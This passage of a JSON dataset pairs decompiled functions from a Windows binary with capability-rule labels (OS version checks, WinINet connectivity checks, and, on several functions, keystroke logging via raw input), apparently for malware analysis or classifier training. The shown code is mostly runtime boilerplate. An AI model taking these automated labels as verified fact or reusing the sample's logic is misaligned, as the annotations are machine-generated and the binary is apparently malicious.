        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0048c5ee)\n\nvoid fcn.0048c5a8(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = 0x48c5c4;\n    fcn.004059cc();\n    uStack36 = 0x48c629;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    fcn.0048c428();\n    fcn.00409b6c();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x48c630;\n    uStack36 = 0x48c628;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 217
    },
    "0048d0ac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0048d0ac(void)\n\n{\n    uint *in_FS_OFFSET;\n    bool bVar1;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x48d11e;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    bVar1 = *0x495918 == 0;\n    *0x495918 = *0x495918 + -1;\n    if (bVar1) {\n        fcn.0040521c();\n        fcn.00405244();\n        if (*0x4957f5 != '\\0') {\n            fcn.00405584();\n        }\n        fcn.0040e1e8();\n        fcn.00406eac();\n        fcn.0040e304();\n        fcn.0040f49c();\n        fcn.0040ebbc();\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 234
    },
    "00402370": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint8_t * __fastcall fcn.00402370(uint param_1, uint8_t *param_2)\n\n{\n    int64_t iVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    iVar1 = (in_EAX + 1) * 0x89705f41;\n    uVar3 = iVar1 >> 0x20;\n    uVar2 = uVar3 >> 0x1d;\n    uVar4 = (uVar3 & 0x1fffffff) * 5 + (iVar1 >> 0x1e);\n    *param_2 = iVar1 >> 0x3d | 0x30;\n    param_2 = param_2 + (uVar2 != 0);\n    uVar2 = uVar2 | uVar4 >> 0x1c;\n    *param_2 = uVar4 >> 0x1c | 0x30;\n    uVar3 = (uVar4 & 0xfffffff) * 5;\n    param_2 = param_2 + (uVar2 != 0);\n    uVar4 = (uVar4 & 0xfffffff) * 5 & 0x7ffffff;\n    uVar2 = uVar2 | uVar3 >> 0x1b;\n    *param_2 = uVar3 >> 0x1b | 0x30;\n    uVar3 = uVar4 * 5;\n    param_2 = param_2 + (uVar2 != 0);\n    uVar4 = uVar4 * 5 & 0x3ffffff;\n    uVar2 = uVar2 | uVar3 >> 0x1a;\n    *param_2 = uVar3 >> 0x1a | 0x30;\n    uVar3 = uVar4 * 5;\n    param_2 = param_2 + (uVar2 != 0);\n    uVar4 = uVar4 * 5 & 0x1ffffff;\n    uVar2 = uVar2 | uVar3 >> 0x19;\n    *param_2 = uVar3 >> 0x19 | 0x30;\n    uVar3 = uVar4 * 5;\n    param_2 = param_2 + (uVar2 != 0);\n    uVar4 = uVar4 * 5 & 0xffffff;\n    uVar2 = uVar2 | uVar3 >> 0x18;\n    *param_2 = uVar3 >> 0x18 | 0x30;\n    param_2 = param_2 + (uVar2 != 0);\n    uVar3 = uVar4 * 5 >> 0x17;\n    uVar4 = uVar4 * 5 & 0x7fffff;\n    uVar2 = uVar2 | uVar3;\n    *param_2 = uVar3 | 0x30;\n    param_2 = param_2 + (uVar2 != 0);\n    uVar3 = uVar4 * 5 >> 0x16;\n    uVar4 = uVar4 * 5 & 0x3fffff;\n    uVar2 = uVar2 | uVar3;\n    *param_2 = uVar3 | 0x30;\n    param_2 = param_2 + (uVar2 != 0);\n    uVar3 = uVar4 * 5 >> 0x15;\n    *param_2 = uVar3 | 0x30;\n    param_2[(uVar2 | uVar3) != 0] = (uVar4 * 5 & 0x1fffff) * 5 >> 0x14 | 0x30;\n    return param_2 + ((uVar2 | uVar3) != 0) + 1;\n}\n",
        "token_count": 861
    },
    "00404a2c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00404a2c(void)\n\n{\n    if (1 < *0x48f028) {\n        (**0x493014)(0xeedfadf, 0, 0, 0);\n    }\n    return;\n}\n",
        "token_count": 54
    },
    "00404a84": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00404a84(void)\n\n{\n    uint in_EAX;\n    int32_t unaff_EBX;\n    uint uVar1;\n    uint auStack8 [2];\n    \n    if (1 < *0x48f028) {\n        auStack8[0] = *(unaff_EBX + 4);\n        uVar1 = 0;\n        (**0x493014)(0xeedfae0, 0, 1, auStack8);\n        return uVar1;\n    }\n    return in_EAX;\n}\n",
        "token_count": 119
    },
    "00404a98": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00404a98(void)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    \n    if (1 < *0x48f028) {\n        uVar1 = 0;\n        (**0x493014)(0xeedfae0, 0, 1, &stack0xfffffff8);\n        return uVar1;\n    }\n    return in_EAX;\n}\n",
        "token_count": 88
    },
    "00404acc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404acc(uint param_1, uint param_2)\n\n{\n    uint uStack16;\n    uint uStack8;\n    \n    if (1 < *0x48f028) {\n        uStack16 = 0x404add;\n        uStack8 = param_2;\n        fcn.00404aac();\n        (**0x493014)(0xeedfae1, 0, 1, &stack0xfffffff0);\n    }\n    return;\n}\n",
        "token_count": 108
    },
    "00404af4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404af4(uint param_1, uint param_2)\n\n{\n    uint uStack4;\n    \n    if (1 < *0x48f028) {\n        uStack4 = param_2;\n        (**0x493014)(0xeedfae2, 0, 1, &uStack4);\n    }\n    return;\n}\n",
        "token_count": 82
    },
    "00404b10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00404b10(uint param_1, uint param_2)\n\n{\n    uint in_EAX;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack8 = param_2;\n    uStack4 = in_EAX;\n    if (1 < *0x48f028) {\n        (**0x493014)(0xeedfae3, 0, 2, &uStack8);\n    }\n    return CONCAT44(uStack8, uStack4);\n}\n",
        "token_count": 112
    },
    "00405c6c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405c6c(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = 0;\n    if (0 < param_2) {\n        iVar1 = *in_EAX;\n        if ((iVar1 != 0) && (*(iVar1 + -8) == 1)) {\n            fcn.00402f34();\n            *in_EAX = iVar1;\n            *(iVar1 + -4) = param_2;\n            *(param_2 + iVar1) = 0;\n            return;\n        }\n        iVar1 = fcn.004055f4();\n        if (*in_EAX != 0) {\n            fcn.004030fc();\n        }\n    }\n    fcn.00405530();\n    *in_EAX = iVar1;\n    return;\n}\n",
        "token_count": 195
    },
    "00405f58": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405f58(uint arg_8h)\n\n{\n    fcn.00405ec8();\n    fcn.00405e18();\n    return;\n}\n",
        "token_count": 40
    },
    "00407978": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407978(uint lpMutexAttributes, int32_t arg_ch, uint bInitialOwner)\n\n{\n    sub.kernel32.dll_CreateMutexA(lpMutexAttributes, arg_ch != 0, bInitialOwner);\n    return;\n}\n",
        "token_count": 53
    },
    "00408700": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.00408700(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.wsock32.dll___WSAFDIsSet();\n    return iVar1 != 0;\n}\n",
        "token_count": 44
    },
    "0040a83c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.0040a83c(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    uVar1 = fcn.004059dc(0);\n    iVar2 = sub.kernel32.dll_CreateDirectoryA(uVar1);\n    return iVar2 != 0;\n}\n",
        "token_count": 65
    },
    "0040ab08": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040ab08(uint32_t param_1)\n\n{\n    char cVar1;\n    uchar auStack53 [33];\n    uchar *puStack20;\n    uchar uStack16;\n    \n    puStack20 = auStack53 + 1;\n    if (0x1f < param_1) {\n        param_1 = 0x1f;\n    }\n    cVar1 = fcn.0040e518();\n    if (cVar1 == '\\x01') {\n        param_1 = param_1 - 1;\n    }\n    fcn.0040a89c();\n    auStack53[param_1 + 1] = 0;\n    uStack16 = 6;\n    fcn.0040975c();\n    return;\n}\n",
        "token_count": 170
    },
    "0040b988": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n\nuchar __cdecl fcn.0040b988(double *arg_8h)\n\n{\n    uint16_t *puVar1;\n    uint16_t in_AX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint16_t in_CX;\n    int32_t iVar4;\n    uint16_t in_DX;\n    int32_t iVar5;\n    uint var_8h;\n    uchar var_3h;\n    uint var_2h;\n    \n    var_3h = 0;\n    uVar2 = fcn.0040b94c();\n    iVar5 = (uVar2 & 0x7f) * 0x18;\n    if ((((in_AX != 0) && (in_AX < 10000)) && (in_DX != 0)) &&\n       (((in_DX < 0xd && (in_CX != 0)) && (puVar1 = iVar5 + 0x48f7f6 + in_DX * 2,  in_CX < *puVar1 || in_CX == *puVar1))\n       )) {\n        iVar3 = in_DX - 1;\n        if (0 < iVar3) {\n            iVar4 = 1;\n            do {\n                in_CX = in_CX + *(iVar5 + 0x48f7f6 + iVar4 * 2);\n                iVar4 = iVar4 + 1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n        iVar3 = in_AX - 1;\n        iVar5 = iVar3;\n        if (iVar3 < 0) {\n            iVar5 = in_AX + 2;\n        }\n        *arg_8h = ((iVar3 * 0x16d + (iVar5 >> 2)) - iVar3 / 100) + iVar3 / 400 + in_CX + -0xa955a;\n        var_3h = 1;\n    }\n    return var_3h;\n}\n",
        "token_count": 446
    },
    "0040e304": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040e304(void)\n\n{\n    int32_t iVar1;\n    uint uStack148;\n    uint uStack144;\n    uint32_t uStack140;\n    int32_t iStack136;\n    \n    uStack148 = 0x94;\n    iVar1 = sub.kernel32.dll_GetVersionExA(&uStack148);\n    if (iVar1 != 0) {\n        *0x48f7e0 = iStack136;\n        *0x48f7e4 = uStack148;\n        *0x48f7e8 = uStack144;\n        if (iStack136 == 1) {\n            *0x48f7ec = uStack140 & 0xffff;\n        }\n        else {\n            *0x48f7ec = uStack140;\n        }\n        fcn.004057a0();\n    }\n    return;\n}\n",
        "token_count": 190
    },
    "004102bc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004102bc(uint arg_8h, int32_t arg_ch, uint noname_2, int16_t *arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack20 = &fcn.004102bc::var_1h + 1;\n    uStack24 = 0x410329;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    if (arg_ch == 0x400) {\n        fcn.004057d4();\n        fcn.0040a074();\n        *arg_14h = -(var_1h != '\\0');\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x410330;\n    uStack24 = 0x410328;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 251
    },
    "00410420": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410420(uint arg_8h, int32_t arg_ch, uint noname_2, uint *arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    if (arg_14h != NULL) {\n        *arg_14h = 0;\n    }\n    uStack20 = 0x410484;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (arg_ch == 0x400) {\n        fcn.0040a110();\n        fcn.00405ea8();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x41048b;\n    uStack20 = 0x410483;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 215
    },
    "00412ffc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00412ffc(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack28 = 0x4130ae;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    fcn.00415154();\n    uVar3 = var_4h;\n    iVar2 = (***0x492518)(var_4h, 0x400, 0, &var_8h);\n    if (iVar2 == -0x7ffdfffb) {\n        fcn.004057d4();\n        cVar1 = fcn.0040a074();\n        if (cVar1 == '\\0') {\n            fcn.00411288();\n        }\n    }\n    else if (iVar2 == 0) {\n        var_8h = var_8h & 0xffffff | 1 - (var_8h == 0) << 0x18;\n    }\n    else {\n        fcn.00411288();\n    }\n    *in_FS_OFFSET = uVar3;\n    fcn.00405530(0x4130b5);\n    fcn.00405d28();\n    return;\n}\n",
        "token_count": 355
    },
    "004130c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004130c0(void)\n\n{\n    uchar *puStack24;\n    uchar auStack20 [16];\n    \n    puStack24 = auStack20;\n    sub.oleaut32.dll_VariantInit();\n    (***0x492698)(&puStack24);\n    fcn.00411288();\n    return 1;\n}\n",
        "token_count": 75
    },
    "00413164": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __fastcall fcn.00413164(uint param_1, char *param_2)\n\n{\n    uint uVar1;\n    uint uStack28;\n    \n    uVar1 = fcn.00416168();\n    if (uVar1 != '\\0') {\n        sub.oleaut32.dll_VariantInit();\n        (**(uStack28 + 0x1c))(0xb);\n        *param_2 = '\\x01' - (uStack28 == 0);\n    }\n    return uVar1;\n}\n",
        "token_count": 138
    },
    "00415a68": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00415a68(uint param_1, char param_2)\n\n{\n    uint16_t *in_EAX;\n    \n    if ((*in_EAX & 0xbfe8) != 0) {\n        fcn.004115b0();\n    }\n    *in_EAX = 0xb;\n    in_EAX[4] = -(param_2 != '\\0');\n    return;\n}\n",
        "token_count": 91
    },
    "00419b70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00419b70(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = 0x419b82;\n    fcn.00419bf8();\n    uStack20 = 0x419bec;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    if (*(in_EAX + 0x20) != '\\x01') {\n        puStack16 = &stack0xfffffffc;\n        iVar1 = fcn.004198e4();\n        if (iVar1 != -1) {\n            if (*(in_EAX + 0x20) == '\\x02') {\n                fcn.00419814();\n            }\n            goto code_r0x00419bd6;\n        }\n    }\n    fcn.00419730();\ncode_r0x00419bd6:\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x419bf3;\n    uStack20 = 0x419beb;\n    fcn.00419c5c();\n    return;\n}\n",
        "token_count": 285
    },
    "0041fbc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041fbc0(uint param_1, uint32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_SetThreadPriority(*(in_EAX + 4), *((param_2 & 0xff) * 4 + 0x48fb30));\n    fcn.0041fb80();\n    return;\n}\n",
        "token_count": 83
    },
    "0041fea0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar * fcn.0041fea0(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uchar *puVar2;\n    uint uStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar auStack32 [24];\n    \n    uStack44 = *(in_EAX + 4);\n    puStack52 = 0x41feb3;\n    iVar1 = sub.kernel32.dll_GetCurrentThreadId_1();\n    if (iVar1 == **0x4927d8) {\n        iVar1 = 0;\n        uStack40 = *0x4979b8;\n        do {\n            if (iVar1 == 2) {\n                sub.user32.dll_PeekMessageA(&stack0xffffffd4, 0, 0, 0, 0);\n            }\n            uStack40 = 0x40;\n            uStack44 = 1000;\n            uStack48 = 0;\n            puStack52 = &stack0xffffffe0;\n            uStack56 = 2;\n            iVar1 = sub.user32.dll_MsgWaitForMultipleObjects();\n            fcn.0041fb80();\n            if (iVar1 == 1) {\n                fcn.0041f734();\n            }\n        } while (iVar1 != 0);\n    }\n    else {\n        puStack52 = 0xffffffff;\n        uStack56 = uStack44;\n        sub.kernel32.dll_WaitForSingleObject();\n    }\n    puVar2 = puStack52;\n    sub.kernel32.dll_GetExitCodeThread(puStack52, &stack0xffffffc8);\n    fcn.0041fb80();\n    return puVar2;\n}\n",
        "token_count": 376
    },
    "00420274": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00420274(char param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if ((param_1 == '\\x01') && (param_2 != 0)) {\n        fcn.00420258();\n    }\n    if (*(in_EAX + 0x10) != 0) {\n        iVar2 = *(*(in_EAX + 0x10) + 8) + -1;\n        while (-1 < iVar2) {\n            piVar1 = fcn.00419888();\n            (**(*piVar1 + 0x10))();\n            iVar2 = iVar2 + -1;\n            if (*(*(in_EAX + 0x10) + 8) <= iVar2) {\n                iVar2 = *(*(in_EAX + 0x10) + 8) + -1;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 218
    },
    "0042161c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0042161c(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (in_EAX == 1) {\n        return 1;\n    }\n    if (in_EAX == 2) {\n        uVar1 = 2;\n    }\n    else if (in_EAX == 4) {\n        uVar1 = 3;\n    }\n    else if (in_EAX == 3) {\n        uVar1 = 4;\n    }\n    else {\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 130
    },
    "00421fe8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nvoid fcn.00421fe8(void)\n\n{\n    int32_t arg_ch;\n    uchar *arg_8h;\n    uchar auStack20 [4];\n    \n    arg_8h = auStack20;\n    arg_ch = fcn.00421f38();\n    if (arg_ch < 1) {\n        fcn.00405530();\n    }\n    else {\n        fcn.00405620();\n        fcn.004059dc();\n        fcn.00422170(arg_8h, arg_ch);\n        if ((arg_8h == '\\x01') || (arg_8h == '\\x02')) {\n            fcn.004059dc();\n            fcn.0040a858();\n            fcn.00405c6c();\n        }\n        else {\n            fcn.004215ac();\n        }\n    }\n    return;\n}\n",
        "token_count": 184
    },
    "004243e8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004243e8(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t iStack108;\n    int32_t iStack104;\n    char cStack100;\n    char cStack99;\n    char cStack98;\n    uchar uStack97;\n    uint8_t uStack93;\n    \n    piVar2 = 0x48fb88;\n    piVar3 = param_2;\n    for (iVar1 = 0xc; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *piVar3 = *piVar2;\n        piVar2 = piVar2 + 1;\n        piVar3 = piVar3 + 1;\n    }\n    if (in_EAX != 0) {\n        iVar1 = sub.gdi32.dll_GetObjectA();\n        if (iVar1 != 0) {\n            param_2[1] = in_EAX;\n            if (699 < iStack104) {\n                *(param_2 + 0xd) = *(param_2 + 0xd) | 1;\n            }\n            if (cStack100 == '\\x01') {\n                *(param_2 + 0xd) = *(param_2 + 0xd) | 2;\n            }\n            if (cStack99 == '\\x01') {\n                *(param_2 + 0xd) = *(param_2 + 0xd) | 4;\n            }\n            if (cStack98 == '\\x01') {\n                *(param_2 + 0xd) = *(param_2 + 0xd) | 8;\n            }\n            *(param_2 + 0xe) = uStack97;\n            fcn.00404100();\n            fcn.004039ac();\n            if ((uStack93 & 0xf) == 1) {\n                *(param_2 + 3) = 2;\n            }\n            else if ((uStack93 & 0xf) == 2) {\n                *(param_2 + 3) = 1;\n            }\n            else {\n                *(param_2 + 3) = 0;\n            }\n            *param_2 = in_EAX;\n            param_2[2] = iStack108;\n        }\n    }\n    return;\n}\n",
        "token_count": 529
    },
    "00424f38": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00424f38(void)\n\n{\n    fcn.00424ea0();\n    fcn.00424ebc();\n    return;\n}\n",
        "token_count": 34
    },
    "00425054": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00425054(void)\n\n{\n    fcn.00424ea0();\n    fcn.00424ebc();\n    return;\n}\n",
        "token_count": 33
    },
    "00428060": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00428060(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iStack112;\n    int32_t iStack72;\n    \n    iVar1 = (***param_2)();\n    iVar2 = fcn.0041b704();\n    if (100 < iVar1 - iVar2) {\n        (**(*param_2 + 0xc))();\n        (**(*param_2 + 0x14))();\n        if ((iStack112 == 1) && (iStack72 == 0x464d4520)) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 154
    },
    "004280c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
